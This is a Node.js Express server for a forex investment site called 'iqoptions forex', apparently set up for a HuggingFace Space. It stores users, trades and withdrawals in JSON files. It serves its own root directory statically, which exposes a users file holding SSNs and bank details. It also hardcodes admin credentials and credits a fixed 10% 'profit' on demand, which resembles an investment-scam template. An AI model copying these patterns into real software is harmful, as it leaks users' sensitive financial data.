const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const path = require('path');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 7860;

// Middleware (HuggingFace compatible)
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(".")); // Serve everything from root directory

// Session middleware
app.use(session({
    secret: process.env.SESSION_SECRET || 'huggingface-space-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// JSON file for persistent user storage (instead of MySQL)
const usersFile = path.join(__dirname, 'users.json');
const tradesFile = path.join(__dirname, 'trades.json');
const withdrawalsFile = path.join(__dirname, 'withdrawals.json');

// Load data from JSON files
function loadUsers() {
    try {
        if (fs.existsSync(usersFile)) {
            const data = fs.readFileSync(usersFile, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Error loading users:', error);
    }
    return [];
}

function loadTrades() {
    try {
        if (fs.existsSync(tradesFile)) {
            const data = fs.readFileSync(tradesFile, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Error loading trades:', error);
    }
    return [];
}

function loadWithdrawals() {
    try {
        if (fs.existsSync(withdrawalsFile)) {
            const data = fs.readFileSync(withdrawalsFile, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Error loading withdrawals:', error);
    }
    return [];
}

// Save data to JSON files
function saveUsers() {
    try {
        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
        console.log('💾 Users saved to file. Total users:', users.length);
    } catch (error) {
        console.error('Error saving users:', error);
    }
}

function saveTrades() {
    try {
        fs.writeFileSync(tradesFile, JSON.stringify(trades, null, 2));
        console.log('💾 Trades saved to file. Total trades:', trades.length);
    } catch (error) {
        console.error('Error saving trades:', error);
    }
}

function saveWithdrawals() {
    try {
        fs.writeFileSync(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
        console.log('💾 Withdrawals saved to file. Total withdrawals:', withdrawals.length);
    } catch (error) {
        console.error('Error saving withdrawals:', error);
    }
}

// Initialize data from files
let users = loadUsers();
let trades = loadTrades();
let withdrawals = loadWithdrawals();

// Utility function to generate random IDs
function generateId(length = 6) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length).toUpperCase();
}

// Generate transaction ID
function generateTransactionId() {
    return 'TRX' + Date.now().toString().slice(-9) + Math.random().toString(36).substr(2, 3).toUpperCase();
}

// Routes

// Serve main pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/about.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'about.php'));
});

app.get('/packages.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'packages.php'));
});

app.get('/terms.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'terms.php'));
});

app.get('/successful_reg.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'successful_reg.php'));
});

app.get('/success_recovery.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'success_recovery.php'));
});

// Auth pages
app.get('/access/login.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'access/login.html'));
});

app.get('/access/register.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'access/register.html'));
});

app.get('/access/forget_password.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'access/forget_password.html'));
});

app.get('/access/adminlogin.php', (req, res) => {
    res.sendFile(path.join(__dirname, 'access/adminlogin.html'));
});

// Dashboard pages
app.get('/dashboard/home.php', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard/home.html'));
});

app.get('/dashboard/profile.php', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard/profile.html'));
});

app.get('/dashboard/wallet.php', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard/wallet.html'));
});

app.get('/dashboard/transactions.php', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard/transactions.html'));
});

app.get('/dashboard/admin_dashboard.php', requireAdminAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard/admin_dashboard.html'));
});

// API Routes

// Health check endpoint (HuggingFace compatible)
app.get("/api/health", (req, res) => {
    res.json({ 
        status: "OK", 
        timestamp: new Date().toISOString(),
        usersCount: users.length,
        tradesCount: trades.length,
        withdrawalsCount: withdrawals.length,
        storage: "json-file"
    });
});

// User registration
app.post('/controller/registration.php', async (req, res) => {
    try {
        const { name, email, country, password, cpassword, terms } = req.body;
        
        if (password !== cpassword) {
            req.session.alertMsg = '<div class="alert alert-danger">Passwords do not match!</div>';
            return res.redirect('/access/register.php');
        }
        
        if (!terms) {
            req.session.alertMsg = '<div class="alert alert-danger">You must accept the terms and conditions!</div>';
            return res.redirect('/access/register.php');
        }
        
        // Check if email already exists
        const existingUser = users.find(user => user.email === email);
        if (existingUser) {
            req.session.alertMsg = '<div class="alert alert-danger">Email already registered!</div>';
            return res.redirect('/access/register.php');
        }
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        const accountId = generateId();
        const token = generateId(12);
        
        // Create new user
        const newUser = {
            id: users.length + 1,
            account_id: accountId,
            name: name,
            email: email,
            phone: '',
            plan: '',
            country: country,
            bank: '',
            account_name: '',
            account_number: '',
            ssn: '',
            pobox: '',
            token: token,
            status: 1, // Auto-verify for demo
            date: new Date().toLocaleString(),
            password: hashedPassword,
            balance: 0,
            profit: 0
        };
        
        users.push(newUser);
        saveUsers();
        
        // Set session variables
        req.session.reg_name = name;
        req.session.reg_email = email;
        req.session.reg_client_id = accountId;
        
        res.redirect('/successful_reg.php');
        
    } catch (error) {
        console.error('Registration error:', error);
        req.session.alertMsg = '<div class="alert alert-danger">Registration failed. Please try again.</div>';
        res.redirect('/access/register.php');
    }
});

// User login
app.post('/controller/process_login.php', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        const user = users.find(u => u.email === email);
        
        if (!user) {
            req.session.alertMsg = '<div class="alert alert-danger">Invalid email or password!</div>';
            return res.redirect('/access/login.php');
        }
        
        // Verify password
        const isValidPassword = await bcrypt.compare(password, user.password);
        
        if (!isValidPassword) {
            req.session.alertMsg = '<div class="alert alert-danger">Invalid email or password!</div>';
            return res.redirect('/access/login.php');
        }
        
        // Set session
        req.session.user = user;
        req.session.loggedin = true;
        
        res.redirect('/dashboard/home.php');
        
    } catch (error) {
        console.error('Login error:', error);
        req.session.alertMsg = '<div class="alert alert-danger">Login failed. Please try again.</div>';
        res.redirect('/access/login.php');
    }
});

// Admin login
app.post('/access/adminlogin.php', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Default admin credentials (change in production)
        const adminEmail = 'admin@iqoptionsforex.com';
        const adminPassword = 'admin123';
        
        if (email === adminEmail && password === adminPassword) {
            req.session.admin = adminEmail;
            req.session.admin_id = 1;
            req.session.admin_loggedin = true;
            res.redirect('/dashboard/admin_dashboard.php');
        } else {
            req.session.alertMsg = '<div class="alert alert-danger">Invalid admin credentials!</div>';
            res.redirect('/access/adminlogin.php');
        }
        
    } catch (error) {
        console.error('Admin login error:', error);
        req.session.alertMsg = '<div class="alert alert-danger">Admin login failed!</div>';
        res.redirect('/access/adminlogin.php');
    }
});

// Forgot password
app.post('/controller/process_forget_password.php', async (req, res) => {
    try {
        const { email } = req.body;
        
        const user = users.find(u => u.email === email);
        
        if (!user) {
            req.session.alertMsg = '<div class="alert alert-danger">Email not found!</div>';
            return res.redirect('/access/forget_password.php');
        }
        
        const reference_number = generateId(8);
        
        req.session.fullname = user.name;
        req.session.reference_number = reference_number;
        
        res.redirect('/success_recovery.php');
        
    } catch (error) {
        console.error('Forgot password error:', error);
        req.session.alertMsg = '<div class="alert alert-danger">Password recovery failed!</div>';
        res.redirect('/access/forget_password.php');
    }
});

// Contact form
app.post('/controller/process_contact.php', async (req, res) => {
    try {
        const { name, email, message } = req.body;
        
        // In a real app, you'd save this to a database
        console.log('Contact form submission:', { name, email, message });
        
        req.session.contactMsg = '<div class="alert alert-success">Thank you for your message! We will get back to you soon.</div>';
        res.redirect('/');
        
    } catch (error) {
        console.error('Contact form error:', error);
        req.session.contactMsg = '<div class="alert alert-danger">Failed to send message. Please try again.</div>';
        res.redirect('/');
    }
});

// API endpoints for dashboard data
app.get('/api/user/profile', requireAuth, async (req, res) => {
    try {
        const user = users.find(u => u.id === req.session.user.id);
        res.json(user || {});
    } catch (error) {
        console.error('Profile API error:', error);
        res.status(500).json({ error: 'Failed to fetch profile' });
    }
});

app.get('/api/user/trades', requireAuth, async (req, res) => {
    try {
        const userTrades = trades.filter(trade => trade.client_id === req.session.user.account_id)
                                .sort((a, b) => new Date(b.date) - new Date(a.date))
                                .slice(0, 10);
        res.json(userTrades);
    } catch (error) {
        console.error('Trades API error:', error);
        res.status(500).json({ error: 'Failed to fetch trades' });
    }
});

app.get('/api/user/withdrawals', requireAuth, async (req, res) => {
    try {
        const userWithdrawals = withdrawals.filter(w => w.account_id === req.session.user.account_id)
                                          .sort((a, b) => new Date(b.date) - new Date(a.date));
        res.json(userWithdrawals);
    } catch (error) {
        console.error('Withdrawals API error:', error);
        res.status(500).json({ error: 'Failed to fetch withdrawals' });
    }
});

// Update user profile
app.post('/api/user/update-profile', requireAuth, async (req, res) => {
    try {
        const { phone, bank, account_name, account_number, ssn, pobox } = req.body;
        const userIndex = users.findIndex(u => u.id === req.session.user.id);
        
        if (userIndex !== -1) {
            users[userIndex].phone = phone || '';
            users[userIndex].bank = bank || '';
            users[userIndex].account_name = account_name || '';
            users[userIndex].account_number = account_number || '';
            users[userIndex].ssn = ssn || '';
            users[userIndex].pobox = pobox || '';
            
            saveUsers();
            
            // Update session
            req.session.user = users[userIndex];
            
            res.json({ success: true, message: 'Profile updated successfully!' });
        } else {
            res.status(404).json({ success: false, message: 'User not found' });
        }
    } catch (error) {
        console.error('Update profile error:', error);
        res.status(500).json({ success: false, message: 'Failed to update profile' });
    }
});

// Create demo trade (for testing)
app.post('/api/demo/trade', requireAuth, async (req, res) => {
    try {
        const { amount, plan } = req.body;
        const user = users.find(u => u.id === req.session.user.id);
        
        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }
        
        const profit = parseFloat(amount) * 0.1; // 10% profit for demo
        const newTrade = {
            id: trades.length + 1,
            date: new Date().toLocaleString(),
            transact_id: generateTransactionId(),
            client_id: user.account_id,
            status: 'Completed',
            balance: (parseFloat(user.balance || 0) + parseFloat(amount) + profit).toFixed(2),
            profit: profit.toFixed(2),
            bonus: '0'
        };
        
        trades.push(newTrade);
        saveTrades();
        
        // Update user balance
        const userIndex = users.findIndex(u => u.id === req.session.user.id);
        users[userIndex].balance = newTrade.balance;
        users[userIndex].profit = (parseFloat(user.profit || 0) + profit).toFixed(2);
        saveUsers();
        
        req.session.user = users[userIndex];
        
        res.json({ 
            success: true, 
            trade: newTrade,
            message: 'Trade completed successfully!' 
        });
        
    } catch (error) {
        console.error('Demo trade error:', error);
        res.status(500).json({ success: false, message: 'Trade failed' });
    }
});

// Logout
app.get('/controller/logout.php', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// Middleware to require authentication
function requireAuth(req, res, next) {
    if (req.session.loggedin) {
        next();
    } else {
        res.redirect('/access/login.php');
    }
}

// Middleware to require admin authentication
function requireAdminAuth(req, res, next) {
    if (req.session.admin_loggedin) {
        next();
    } else {
        res.redirect('/access/adminlogin.php');
    }
}

// 404 handler for API routes
app.use('/api/*', (req, res) => {
    res.status(404).json({
        success: false,
        message: 'API endpoint not found'
    });
});

// Start server (HuggingFace compatible)
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 iqoptions forex Server running on port ${PORT}`);
    console.log(`📊 Loaded ${users.length} users from storage`);
    console.log(`📈 Loaded ${trades.length} trades from storage`);
    console.log(`💰 Loaded ${withdrawals.length} withdrawals from storage`);
    console.log(`🌐 Main Website: http://localhost:${PORT}`);
    console.log(`🔐 Login: http://localhost:${PORT}/access/login.php`);
    console.log(`📱 Register: http://localhost:${PORT}/access/register.php`);
    console.log(`🔍 Health check: http://localhost:${PORT}/api/health`);
    console.log('✅ Server is ready for HuggingFace Space!');
});

// Export for HuggingFace
module.exports = app;
